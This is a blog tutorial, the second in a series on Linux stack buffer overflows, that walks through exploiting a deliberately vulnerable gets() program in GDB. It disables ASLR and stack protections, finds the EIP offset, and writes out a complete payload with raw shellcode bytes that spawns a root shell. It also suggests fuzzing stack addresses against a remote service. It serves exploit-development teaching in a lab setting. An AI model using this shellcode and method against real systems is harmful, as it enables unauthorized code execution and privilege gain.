---
layout: post
title:  "Stack Buffer Overflows: Linux 2 - Using GDB"
date:   2018-01-17 01:00:00 +0100
categories: [bof]
description: v0.1
image:
  feature: shellcode2.jpg
  credit:
  creditlink:
---
In Chapter 2 of my Linux Stack Buffer Overflow series I'll be walking you through crafting an exploit from scratch in GDB with no external hints of the environment.  If you're new to this type of exploit I'd recommend going through [Chapter 1](/bof/linux-stack-bof-1.html). 

One issue with crafting an exploit in GDB and then running it outside, is that the exploit simply no longer works.  In the previous chapter, we were printing out the location of our exploit in memory, but what if we don't have that luxury? To show you how to overcome this, we'll be using the following code.

```c
#include <stdio.h>

int main(){
  bof();
  return 0;
}

int bof()
{
  char buffer[128];
  gets(buffer);
  return 0;
}

```  

### Step 1: Equalise the environment

There can be a number of reasons for this, but by far the most common is that the stack offsets outside GDB are different within GDB.  This [stack overflow](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966) answer does a good job explaining the exact reason, environment variables.  It also provides a handy script for equalising these inside and outside GDB.  

The script in addition to setting a consistent set of environment variables, forces the step of calling a full rather than relative pathname, i.e `/root/test` vs `./test`. Even if not using this script, always call binaries with their full pathname.

I've demonstrated the use of this script below, and Example 3 from [Chapter 1](/bof/linux-stack-bof-1.html), which shows that the offset is equal in both.

We also need to remove the two added environment variables, LINES and COLUMNS:  

```
unset env LINES
unset env COLUMNS
```

```bash
root@kali:~# ./invoke test
Wanna Smash!?: 0xffffddb0
```
```gdb
root@kali:~# ./invoke -d test
...............SNIP........................
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r
Starting program: /root/test 
Wanna Smash!?: 0xffffddb0
```

We can see that the stack offsets are equal if we take these steps.  It's worth doing even if, like me, you're very lazy as it will save you a lot of stress further down the line.

### Step 2: Overflow the Buffer

So compile the binary, removing all protections.

```bash
root@kali:~/bof# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
root@kali:~/bof# gcc bof.c -o bof  -fno-stack-protector -z execstack -m32
```

The first part of the exploitation process is much the same as in Chapter 1.  We first find the point at which `eip` is overrun using a cyclical sequence.

```bash
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /root/bof/bof 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
```

```
EIP: 0x41416d41 ('AmAA')
```

From this we find `eip` at `0x41416d41`, which is at position 140 in the string.

### Step 3: Examine the Memory

We now have to find where to jump to.  We'll write in a sequence of easily identifiable characters that we can locate when searching memory.  A series of 200 'A' characters should suffice.

```gdb
gdb-peda$ r
Starting program: /root/bof/bof 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Run the find command to search for a series of 'A' characters:  
```
gdb-peda$ find 0x41414141
```
Then find the result where 'A' repeats 200 times on the stack:  
```gdb
[stack] : 0xffffddb0 ('A' <repeats 200 times>)
```

An alternative method is to search around `esp`, the stack pointer and look for this sequence:  
```gdb
gdb-peda$ x/80x $esp-200
0xffffdd78:	0x01	0x00	0x00	0x00	0xb0	0xdd	0xff	0xff
0xffffdd80:	0x38	0xde	0xff	0xff	0x20	0xe3	0xfe	0xf7
0xffffdd88:	0xb0	0xdd	0xff	0xff	0x00	0x70	0x55	0x56
0xffffdd90:	0x01	0x00	0x00	0x00	0x00	0x90	0xf9	0xf7
0xffffdd98:	0x38	0xde	0xff	0xff	0x70	0x55	0x55	0x56
0xffffdda0:	0xb0	0xdd	0xff	0xff	0x01	0x00	0x00	0x00
0xffffdda8:	0xa0	0x34	0xfd	0xf7	0x5a	0x55	0x55	0x56
0xffffddb0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffddb8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffddc0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```
Here we confirm that our sequence begins at `0xffffddb0`.  Assuming this will be the same stack offset, we'll jump to just after this location.

### Step 4: Write your Shellcode

For this we'll just grab [this shellcode](https://www.exploit-db.com/exploits/42177/).
```bash
root@kali:~/bof# python -c 'from struct import pack; print "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b".rjust(140, "\x90")+pack("<L", 0xffffddb0)' > /tmp/var
```

We now test it in GDB, so we know our shellcode is working correctly:  
```gdb
gdb-peda$ r < /tmp/var
Starting program: /root/bof/bof < /tmp/var
process 6648 is executing new program: /bin/dash
[Inferior 1 (process 6648) exited normally]
Warning: not running or target is remote
```
Finally, we just run it outside the program:  
```bash
root@kali:~/bof# (cat /tmp/var; cat)|./invoke bof
id
uid=0(root) gid=0(root) groups=0(root)
ls
bof  bof.c  invoke  peda-session-bof.txt  peda-session-dash.txt
```

Without Invoke
--------------------------------

Of course sometimes the script isn't available to us, or isn't appropriate to the environment.  Say you're exploiting a remote service, and therefore the binary is already loaded and memory locations set.

In this case repeat exactly as above, removing the environment variables again but simply don't use the `invoke` script.  We'll get a different stack address:
```
[stack] : 0xffffd280 ('A' <repeats 200 times>)
```
So we adjust our payload accordingly:
```
root@kali:~/bof# python -c 'from struct import pack; print "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b".rjust(140, "\x90")+pack("<L", 0xffffd280)' > /tmp/var
root@kali:~/bof# (cat /tmp/var; cat)| /root/bof/bof
id
uid=0(root) gid=0(root) groups=0(root)
```
If this doesn't work, then all you need to do is play around with the stack location.  Fuzz that value on stack addresses above and below your current until the exploit succeeds.

Epilogue
-----------

Hopefully now you have a good idea how you'd build an exploit from scratch using GDB.  We've successfully exploited a binary without it intentionally leaking information, but we're still disabling all stack protections.  Next time I'll show you how to bypass the simplest of these, data execution prevention (DEP) and use a technique known as ret2libc.

References
----------
[PEDA](https://github.com/longld/peda)  
[Stack Overflow Answer on Failing GDB Exploit](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966)  
[https://www.exploit-db.com/exploits/42177/](https://www.exploit-db.com/exploits/42177/)  
